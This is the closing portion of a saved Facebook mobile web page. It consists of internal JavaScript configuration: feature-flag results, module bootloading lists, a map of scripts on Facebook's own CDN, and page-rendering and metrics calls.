            "AT5t2BrnO1vWmejrnnr508P2PeyF-IDhRvIGXsBTyEuiPclX38RSwCTPJH6AwY3ViplyCGmx2pzmKgoPw1yYVDBX": {
                "result": false,
                "hash": "AT566oizKJVhlUEH"
            },
            "AT4kYIk7PhRqUACJJM8qs58t-WNCoM2ZYe35b1xv03xf3OtmC7RfXVIT9hWB6yTOgfA": {
                "result": false,
                "hash": "AT5Kku83l3K-kui8"
            },
            "AT42vHZv2FMRQFxjYy8soPYLMZQ4FvEb3npoHjDNtK5L_ed7xyu66vqbi4snBVFxLSGN0ZKY0U-z6rBE6MS3Ht3lEToi6aqMBaQBAYDf8hAjMw": {
                "result": false,
                "hash": "AT6hBR-DG8XC9ghG"
            },
            "AT64OjP4oVuvstFjzbDT-bVZiPbiojG0zyjbyWGW5xqhWd5PV8lOQAaU0boVR7zf5v2SUGNGfZkpE7I19ksV-nLimTCJ0AgU9faj1FK9VMmZbw": {
                "result": false,
                "hash": "AT6Tbdl1ijBQYOgP"
            },
            "AT5O8xsR5x0ELlZ5jOE3X5-ehVC3uoPqq660HQDL4w9wKwvRm4MKxHk4lF9KQ7mHHhkAK-AiXe4wZn4Y6p5yGdCP": {
                "result": false,
                "hash": "AT7b7o5ffFG1k4de"
            },
            "AT7ImPMHuxZIJZ136ME7VyraMwtCKryQmyrFHtgzHkf8ddy4a6_xWA51xIkynmusmXrOGBFVkNSaxGsbLCgQTZHL": {
                "result": false,
                "hash": "AT6HU1LYY-fDU7z9"
            }
        },
        "qexData": {},
        "bootloadable": {
            "BanzaiODS": {
                "resources": ["Jq4O7"],
                "module": 1
            },
            "GeneratedPackerUtils": {
                "resources": ["uYbVb", "qlimw"],
                "module": 1
            },
            "SnappyCompressUtil": {
                "resources": ["v9kMu"],
                "module": 1
            },
            "GeneratedArtilleryUserTimingSink": {
                "resources": ["uYbVb", "9Zaf3", "sGe+Z", "Hx+az"],
                "module": 1
            },
            "Banzai": {
                "resources": [],
                "module": 1
            },
            "BanzaiStream": {
                "resources": ["v9kMu", "Jq4O7", "ZU1ro"],
                "module": 1
            },
            "ResourceTimingBootloaderHelper": {
                "resources": ["dHW6g", "Jq4O7"],
                "module": 1
            },
            "TimeSliceHelper": {
                "resources": ["WyHV3"],
                "module": 1
            },
            "PerfXSharedFields": {
                "resources": ["dHW6g"],
                "module": 1
            },
            "TimeSliceInteractionsLiteTypedLogger": {
                "resources": ["Jq4O7", "FHtgt"],
                "module": 1
            },
            "WebSpeedInteractionsTypedLogger": {
                "resources": ["Jq4O7", "4LL\/S"],
                "module": 1
            }
        },
        "resource_map": {
            "uYbVb": {
                "type": "js",
                "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yh\/r\/Vs01pkrhf9S.js",
                "crossOrigin": 1
            },
            "qlimw": {
                "type": "js",
                "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yY\/r\/ksbW_I3_vkK.js",
                "crossOrigin": 1
            },
            "9Zaf3": {
                "type": "js",
                "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yv\/r\/5ka10Uff-_R.js",
                "crossOrigin": 1
            },
            "sGe+Z": {
                "type": "js",
                "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y2\/r\/hjL11ukJK0h.js",
                "crossOrigin": 1
            },
            "Hx+az": {
                "type": "js",
                "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yz\/r\/bza1TvaqddI.js",
                "crossOrigin": 1
            },
            "DC0fA": {
                "type": "js",
                "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3isCf4\/ye\/l\/pt_BR\/VTNxtty9tLP.js",
                "crossOrigin": 1
            },
            "ZU1ro": {
                "type": "js",
                "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yq\/r\/708Ezmm99ay.js",
                "crossOrigin": 1
            },
            "dHW6g": {
                "type": "js",
                "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yu\/r\/M2LuayoKJHl.js",
                "crossOrigin": 1
            },
            "WyHV3": {
                "type": "js",
                "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yf\/r\/XAFotlxHU25.js",
                "crossOrigin": 1
            },
            "FHtgt": {
                "type": "js",
                "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yd\/r\/rlVu09x5_nO.js",
                "crossOrigin": 1
            },
            "4LL\/S": {
                "type": "js",
                "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yA\/r\/rw8eejqoJci.js",
                "crossOrigin": 1
            },
            "FEt5G": {
                "type": "js",
                "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yy\/r\/w8QtjEXdqdW.js",
                "crossOrigin": 1
            }
        }
    });
</script>
<script id="u_0_n">
    require("MRenderingScheduler").getInstance().init("6597002951490280825-0", {
        "ttiPagelets": []
    });
</script>
<script id="u_0_o">
    require("MRenderingScheduler").preArrive({
        "name": "pagelet_0_0",
        "serverlid": "6597002951490280825-0"
    })
</script>
<script id="u_0_p">
    require("MRenderingScheduler").getInstance().schedule({
        "id": "pagelet_0_0",
        "pageletConfig": {
            "lid": "6597002951490280825-60001",
            "serverlid": "6597002951490280825-0",
            "name": "pagelet_0_0",
            "pass": 4,
            "serverJSData": [],
            "onload": "",
            "onafterload": "",
            "scheduledMarkupIndex": 0,
            "templateContainer": "static_templates",
            "templates": {
                "__html": ""
            },
            "ixData": {},
            "bxData": {},
            "gkxData": {},
            "qexData": {},
            "resource_map": {},
            "bootloadable": {},
            "type": "chrome"
        },
        "displayResources": [],
        "normalResources": [],
        "content": {
            "__html": ""
        }
    }, function() {
        require("NavigationMetrics").postPagelet(false, "pagelet_0_0", "6597002951490280825-0");
    });
</script>
<script id="u_0_r">
    require("Bootloader").setResourceMap({});
</script>
<script id="u_0_q">
    require("MRenderingScheduler").getInstance().setPageletCount(1);
    require("NavigationMetrics").setPage({
        "page": "\/wap\/index.php",
        "page_type": "normal",
        "page_uri": "https:\/\/m.facebook.com\/?refsrc=https\u00253A\u00252F\u00252Fpt-br.facebook.com\u00252F&_rdr",
        "serverLID": "6597002951490280825-0"
    });
    require("TimeSlice").guard(function() {
        (require("ServerJSDefine")).handleDefines([]);
        new(require("ServerJS"))().handle({});
    }, "ServerJS define", {
        "root": true
    })();
    require("TimeSlice").guard(function() {
        (require("ServerJSDefine")).handleDefines([]);
        new(require("ServerJS"))().handle({});
    }, "ServerJS define", {
        "root": true
    })();
</script>
</body>
</html>